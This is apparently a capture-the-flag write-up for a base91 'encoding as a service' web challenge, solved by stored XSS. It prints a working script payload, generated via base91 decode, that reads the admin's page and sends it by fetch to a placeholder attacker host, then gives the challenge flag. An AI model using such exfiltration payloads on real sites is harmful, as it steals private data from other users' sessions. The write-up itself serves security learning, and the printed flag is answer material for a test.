#### Challenge:

Based encoding as a service. But can we insert a little tomfoolery? Let's find out.
[based.skin](https://based.skin/)

[Download challenge files](./based.zip ":ignore")

---

#### Solution:

This is a stored-XSS challenge. The flag lives in the database as an encoding owned by `admin`, and
`/report` sends an **admin bot** (puppeteer, logged in as `admin`) to visit `/e/<id>`. So I need an
encoding whose page runs my JavaScript in the admin's browser and exfiltrates the flag.

Two things make that look impossible at first, and both turn out to be the "tomfoolery":

1. **The sink is unescaped and the CSP is wide open.** `view_encoding.html` renders the stored text
   with `{{ encoding["text"]|safe }}`, and the response header is
   `Content-Security-Policy: script-src 'unsafe-inline';` &mdash; inline `<script>` is explicitly
   **allowed**, and with no `default-src`/`connect-src` I can `fetch()` anywhere to exfiltrate.

2. **`/create` base91-encodes my input**, so I don't control the stored bytes directly &hellip; except
   base91 is a **bijection**, and its alphabet happens to contain `< > / " ( ) [ ] { } = + ? : @ \``
   and backtick. So I can make the *encoding* be arbitrary HTML: take my payload, run it through
   base91 **decode**, submit the result (the app accepts a hex body via its
   `^[a-f0-9]+$` branch), and the app's base91 **encode** step reproduces my payload verbatim.

The base91 alphabet has **no `.`, `'`, space, or `-`**, so the payload must avoid them &mdash; I use
backtick template strings and bracket member access instead of dots:

```python
import based91   # the challenge's own module
# flag is shown on the admin's "/" listing; fetch it and exfiltrate to my server (no '.', no quotes, no spaces)
payload = ("<script>fetch(`/`)[`then`](r=>r[`text`]()[`then`]"
           "(t=>fetch(`//MYHOST:PORT/?c=`+btoa(t))))</script><b>")
body = based91.decode(payload).hex()   # submit this as the "text" field; service re-encodes it to `payload`
```

(The trailing `<b>` is throwaway padding: base91's last output character is ambiguous, so the junk
lands on the filler and leaves `</script>` intact.) I then POST `body` to `/create`, take the
resulting `/e/<id>`, and `/report` it. The admin bot opens it, the inline script runs as `admin`,
reads the flag off the admin's page and sends it to my listener.

I reproduced the whole chain locally against the provided Flask app and the real `adminbot.js`
(puppeteer): the crafted hex round-trips back to the exact `<script>` in the rendered `/e/<id>`
page, and the admin bot executes it and fires the exfiltration request.

---

<details><summary>FLAG:</summary>

```
flag{bas3d_enc0dings_str1p_off_ur_sk1n}
```

</details>
